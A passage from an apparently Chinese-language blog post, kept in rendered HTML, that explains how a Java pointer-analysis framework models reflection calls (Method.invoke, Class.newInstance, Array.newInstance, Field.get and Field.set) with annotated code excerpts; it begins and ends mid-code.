class="keyword">return</span> desc.equals(REFLECTION_LOG_DESC)</span><br><span class="line">                ? heapModel.getMockObj(desc, classLiteral, clazz)</span><br><span class="line">                : heapModel.getConstantObj(classLiteral);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (classOrTypeOrMember <span class="keyword">instanceof</span> JMethod m) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m.isConstructor()) &#123;</span><br><span class="line">            <span class="keyword">return</span> heapModel.getMockObj(desc, classOrTypeOrMember, constructor);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> heapModel.getMockObj(desc, classOrTypeOrMember, method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (classOrTypeOrMember <span class="keyword">instanceof</span> JField) &#123;</span><br><span class="line">        <span class="keyword">return</span> heapModel.getMockObj(desc, classOrTypeOrMember, field);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                <span class="string">&quot;Expected JClass or ClassMember,&quot;</span> + <span class="string">&quot; given &quot;</span> + classOrTypeOrMember);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Method-invoke-java-lang-Object-java-lang-Object"><a href="#Method-invoke-java-lang-Object-java-lang-Object" class="headerlink" title="Method.invoke(java.lang.Object,java.lang.Object[])"></a>Method.invoke(java.lang.Object,java.lang.Object[])</h4><p>针对<code>r=m.invoke(o,a)</code></p><p>总结：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])&gt;&quot;, argIndexes = &#123;BASE, 0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodInvoke</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isIgnored(invoke)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;PointsToSet&gt; args = getArgs(csVar, pts, invoke, BASE, <span class="number">0</span>);</span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">mtdObjs</span> <span class="operator">=</span> args.get(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// infer m^t_s from m^t_u (obj) with type information at invoke</span></span><br><span class="line">    <span class="keyword">if</span> (typeMatcher.hasTypeInfo(invoke)) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">        <span class="type">Var</span> <span class="variable">m</span> <span class="operator">=</span> InvokeUtils.getVar(invoke, BASE); <span class="comment">// m.invoke(o, args);</span></span><br><span class="line">        mtdObjs.forEach(obj -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (helper.isUnknownMetaObj(obj)) &#123;</span><br><span class="line">                <span class="type">MethodInfo</span> <span class="variable">methodInfo</span> <span class="operator">=</span> helper.getMethodInfo(obj);</span><br><span class="line">                <span class="type">JClass</span> <span class="variable">clazz</span> <span class="operator">=</span> methodInfo.clazz();</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span> &amp;&amp; (!ONLY_APP || clazz.isApplication())) &#123;</span><br><span class="line">                    <span class="comment">// class is known in methodInfo</span></span><br><span class="line">                    Stream&lt;JMethod&gt; targets = methodInfo.isFromGetMethod()</span><br><span class="line">                            ? Reflections.getMethods(clazz)</span><br><span class="line">                            : Reflections.getDeclaredMethods(clazz);</span><br><span class="line">                    targets.filter(target -&gt; !typeMatcher.isUnmatched(invoke, target))</span><br><span class="line">                            .map(helper::getMetaObj)</span><br><span class="line">                            .forEach(mtdObj -&gt; solver.addVarPointsTo(context, m, mtdObj));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// collect unsound Method.invoke() call</span></span><br><span class="line">    <span class="keyword">if</span> (!unsoundInvokes.contains(invoke)) &#123;</span><br><span class="line">        <span class="type">PointsToSet</span> <span class="variable">recvObjs</span> <span class="operator">=</span> args.get(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Var</span> <span class="variable">o</span> <span class="operator">=</span> InvokeUtils.getVar(invoke, <span class="number">0</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">oIsNull</span> <span class="operator">=</span> o.isConst() &amp;&amp; o.getConstValue() <span class="keyword">instanceof</span> NullLiteral;</span><br><span class="line">        <span class="keyword">for</span> (CSObj mtdObj : mtdObjs) &#123;</span><br><span class="line">            <span class="keyword">if</span> (helper.isUnknownMetaObj(mtdObj)) &#123;</span><br><span class="line">                <span class="type">MethodInfo</span> <span class="variable">methodInfo</span> <span class="operator">=</span> helper.getMethodInfo(mtdObj);</span><br><span class="line">                <span class="keyword">if</span> (methodInfo.isClassUnknown()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (oIsNull) &#123;</span><br><span class="line">                        unsoundInvokes.add(invoke);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (CSObj recvObj : recvObjs) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (recvObj.getObject() <span class="keyword">instanceof</span> MockObj mockObj &amp;&amp;</span><br><span class="line">                                mockObj.getDescriptor().equals(UNKNOWN_DESC)) &#123;</span><br><span class="line">                            unsoundInvokes.add(invoke);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Object-newInstance"><a href="#Object-newInstance" class="headerlink" title="Object.newInstance()"></a>Object.newInstance()</h4><p><code>r=class.newInstance()</code></p><p>总结：增加一个指向关系，Var为r，obj为unknownObj</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.Object newInstance()&gt;&quot;, argIndexes = &#123;BASE&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">classNewInstance</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isIgnored(invoke)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">        <span class="keyword">for</span> (CSObj obj : pts) &#123;</span><br><span class="line">            <span class="keyword">if</span> (helper.isUnknownMetaObj(obj)) &#123;</span><br><span class="line">                <span class="type">CSCallSite</span> <span class="variable">csCallSite</span> <span class="operator">=</span> csManager.getCSCallSite(context, invoke);</span><br><span class="line">                <span class="type">Obj</span> <span class="variable">unknownObj</span> <span class="operator">=</span> heapModel.getMockObj(UNKNOWN_DESC,</span><br><span class="line">                        csCallSite, object, invoke.getContainer(), <span class="literal">false</span>);</span><br><span class="line">                solver.addVarPointsTo(context, result, unknownObj);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Object-newInstance-java-lang-Class-int"><a href="#Object-newInstance-java-lang-Class-int" class="headerlink" title="Object.newInstance(java.lang.Class,int)"></a>Object.newInstance(java.lang.Class,int)</h4><p><code>r=class.newInstance(a1,a2)</code></p><p>总结：插入unsoundInvokes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)&gt;&quot;, argIndexes = &#123;0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">collectUnsoundArrayNewInstance</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isIgnored(invoke) || unsoundInvokes.contains(invoke)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (CSObj classObj : pts) &#123;</span><br><span class="line">        <span class="keyword">if</span> (helper.isUnknownMetaObj(classObj)) &#123;</span><br><span class="line">            unsoundInvokes.add(invoke);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-ReflectiveActionModel"><a href="#4-4-ReflectiveActionModel" class="headerlink" title="4.4 ReflectiveActionModel"></a>4.4 ReflectiveActionModel</h2><h3 id="4-4-1-fields"><a href="#4-4-1-fields" class="headerlink" title="4.4.1 fields"></a>4.4.1 fields</h3><ul><li>allTargets: MultiMap&lt;Invoke, Object&gt; 类型</li></ul><h3 id="4-4-2-handlers"><a href="#4-4-2-handlers" class="headerlink" title="4.4.2 handlers"></a>4.4.2 handlers</h3><p>前文分析已经得知，具体是通过InvokeHandler 注册handler 来进行处理匹配的method 逻辑。</p><h4 id="1-Object-newInstance"><a href="#1-Object-newInstance" class="headerlink" title="1. Object.newInstance()"></a>1. Object.newInstance()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.Object newInstance()&gt;&quot;, argIndexes = &#123;BASE&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">classNewInstance</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">    <span class="comment">// 对于每个pts包含的obj</span></span><br><span class="line">    pts.forEach(obj -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (isInvalidTarget(invoke, obj)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取obj的类型对应的JClass</span></span><br><span class="line">        <span class="type">JClass</span> <span class="variable">clazz</span> <span class="operator">=</span> CSObjs.toClass(obj);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取Jclass 的无参构造函数</span></span><br><span class="line">            <span class="type">JMethod</span> <span class="variable">init</span> <span class="operator">=</span> clazz.getDeclaredMethod(initNoArg);</span><br><span class="line">            <span class="keyword">if</span> (init != <span class="literal">null</span> &amp;&amp; !typeMatcher.isUnmatched(invoke, init)) &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">                <span class="type">ClassType</span> <span class="variable">type</span> <span class="operator">=</span> clazz.getType();</span><br><span class="line">                <span class="comment">// 核心逻辑：根据invoke 方法和类型，计算出新的类型</span></span><br><span class="line">                <span class="type">CSObj</span> <span class="variable">csNewObj</span> <span class="operator">=</span> newReflectiveObj(context, invoke, type);</span><br><span class="line">                addReflectiveCallEdge(context, invoke, csNewObj, init, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>isInvalidTarget: 如果日志对反射调用 {@code invoke} 进行了注解、而给定的 {@code metaObj} 并非由日志生成，那么我们将{@code metaObj} 将被视为 {@code invoke} 的无效目标。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isInvalidTarget</span><span class="params">(Invoke invoke, CSObj metaObj)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> invokesWithLog.contains(invoke) &amp;&amp; !helper.isLogMetaObj(metaObj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>具体如何的逻辑？</p></blockquote><p>newReflectiveObj</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Object-newInstance-java-lang-Class-int-1"><a href="#Object-newInstance-java-lang-Class-int-1" class="headerlink" title="Object.newInstance(java.lang.Class,int)"></a>Object.newInstance(java.lang.Class,int)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)&gt;&quot;, argIndexes = &#123;0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">arrayNewInstance</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">    pts.forEach(obj -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (isInvalidTarget(invoke, obj)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Type</span> <span class="variable">baseType</span> <span class="operator">=</span> CSObjs.toType(obj);</span><br><span class="line">        <span class="keyword">if</span> (baseType != <span class="literal">null</span> &amp;&amp; !(baseType <span class="keyword">instanceof</span> VoidType)) &#123;</span><br><span class="line">            <span class="type">ArrayType</span> <span class="variable">arrayType</span> <span class="operator">=</span> typeSystem.getArrayType(baseType, <span class="number">1</span>);</span><br><span class="line">            <span class="type">CSObj</span> <span class="variable">csNewArray</span> <span class="operator">=</span> newReflectiveObj(context, invoke, arrayType);</span><br><span class="line">            solver.addVarPointsTo(context, result, csNewArray);</span><br><span class="line">            allTargets.put(invoke, arrayType);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Field-set-java-lang-Object-java-lang-Object"><a href="#Field-set-java-lang-Object-java-lang-Object" class="headerlink" title="Field.set(java.lang.Object,java.lang.Object)"></a>Field.set(java.lang.Object,java.lang.Object)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.reflect.Field: void set(java.lang.Object,java.lang.Object)&gt;&quot;, argIndexes = &#123;BASE, 0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fieldSet</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">    <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, invoke.getInvokeExp().getArg(<span class="number">1</span>));</span><br><span class="line">    List&lt;PointsToSet&gt; args = getArgs(csVar, pts, invoke, BASE, <span class="number">0</span>);</span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">fldObjs</span> <span class="operator">=</span> args.get(<span class="number">0</span>);</span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">baseObjs</span> <span class="operator">=</span> args.get(<span class="number">1</span>);</span><br><span class="line">    fldObjs.forEach(fldObj -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (isInvalidTarget(invoke, fldObj)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> CSObjs.toField(fldObj);</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (field.isStatic()) &#123;</span><br><span class="line">                <span class="type">StaticField</span> <span class="variable">sfield</span> <span class="operator">=</span> csManager.getStaticField(field);</span><br><span class="line">                solver.addPFGEdge(from, sfield, STATIC_STORE, sfield.getType());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Type</span> <span class="variable">declType</span> <span class="operator">=</span> field.getDeclaringClass().getType();</span><br><span class="line">                baseObjs.forEach(baseObj -&gt; &#123;</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">objType</span> <span class="operator">=</span> baseObj.getObject().getType();</span><br><span class="line">                    <span class="keyword">if</span> (typeSystem.isSubtype(declType, objType)) &#123;</span><br><span class="line">                        <span class="type">InstanceField</span> <span class="variable">ifield</span> <span class="operator">=</span> csManager.getInstanceField(baseObj, field);</span><br><span class="line">                        solver.addPFGEdge(from, ifield, INSTANCE_STORE, ifield.getType());</span><br><span class="line">                        allTargets.put(invoke, field); <span class="comment">// record target</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Field-get-java-lang-Object"><a href="#Field-get-java-lang-Object" class="headerlink" title="Field.get(java.lang.Object)"></a>Field.get(java.lang.Object)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.reflect.Field: java.lang.Object get(java.lang.Object)&gt;&quot;, argIndexes = &#123;BASE, 0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fieldGet</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">    <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, result);</span><br><span class="line">    List&lt;PointsToSet&gt; args = getArgs(csVar, pts, invoke, BASE, <span class="number">0</span>);</span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">fldObjs</span> <span class="operator">=</span> args.get(<span class="number">0</span>);</span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">baseObjs</span> <span class="operator">=</span> args.get(<span class="number">1</span>);</span><br><span class="line">    fldObjs.forEach(fldObj -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (isInvalidTarget(invoke, fldObj)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> CSObjs.toField(fldObj);</span><br><span class="line">        <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (field.isStatic()) &#123;</span><br><span class="line">                <span class="type">StaticField</span> <span class="variable">sfield</span> <span class="operator">=</span> csManager.getStaticField(field);</span><br><span class="line">                solver.addPFGEdge(sfield, to, FlowKind.STATIC_LOAD);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Type</span> <span class="variable">declType</span> <span class="operator">=</span> field.getDeclaringClass().getType();</span><br><span class="line">                baseObjs.forEach(baseObj -&gt; &#123;</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">objType</span> <span class="operator">=</span> baseObj.getObject().getType();</span><br><span class="line">                    <span class="keyword">if</span> (typeSystem.isSubtype(declType, objType)) &#123;</span><br><span class="line">                        <span class="type">InstanceField</span> <span class="variable">ifield</span> <span class="operator">=</span> csManager.getInstanceField(baseObj, field);</span><br><span class="line">                        solver.addPFGEdge(ifield, to, FlowKind.INSTANCE_LOAD);</span><br><span class="line">                        allTargets.put(invoke, field); <span class="comment">// record target</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Object-invoke-java-lang-Object-java-lang-Object"><a href="#Object-invoke-java-lang-Object-java-lang-Object" class="headerlink" title="Object.invoke(java.lang.Object,java.lang.Object[])"></a>Object.invoke(java.lang.Object,java.lang.Object[])</h4><p>思考：针对<code>r=m.invoke(o,a)</code></p><p>总结：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])&gt;&quot;, argIndexes = &#123;BASE, 0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodInvoke</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">    List&lt;PointsToSet&gt; args = getArgs(csVar, pts, invoke, BASE, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// m</span></span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">mtdObjs</span> <span class="operator">=</span> args.get(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// o</span></span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">recvObjs</span> <span class="operator">=</span> args.get(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// a</span></span><br><span class="line">    <span class="type">Var</span> <span class="variable">argsVar</span> <span class="operator">=</span> invoke.getInvokeExp().getArg(<span class="number">1</span>);</span><br><span class="line">    mtdObjs.forEach(mtdObj -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (isInvalidTarget(invoke, mtdObj)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">target</span> <span class="operator">=</span> CSObjs.toMethod(mtdObj);</span><br><span class="line">        <span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; !typeMatcher.isUnmatched(invoke, target)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (target.isStatic()) &#123;</span><br><span class="line">            <span class="comment">// 如果是静态method，调用addReflectiveCallEdge</span></span><br><span class="line">                addReflectiveCallEdge(context, invoke, <span class="literal">null</span>, target, argsVar);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 否则，针对o对应的每一个pts，调用addReflectiveCallEdge</span></span><br><span class="line">                recvObjs.forEach(recvObj -&gt;</span><br><span class="line">                        addReflectiveCallEdge(context, invoke, recvObj, target, argsVar));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最主要的逻辑addReflectiveCallEdge: 增加一条反射调用边</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addReflectiveCallEdge</span><span class="params">(</span></span><br><span class="line"><span class="params">        Context callerCtx, Invoke callSite,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> CSObj recvObj, JMethod callee, Var args)</span> &#123;</span><br><span class="line">  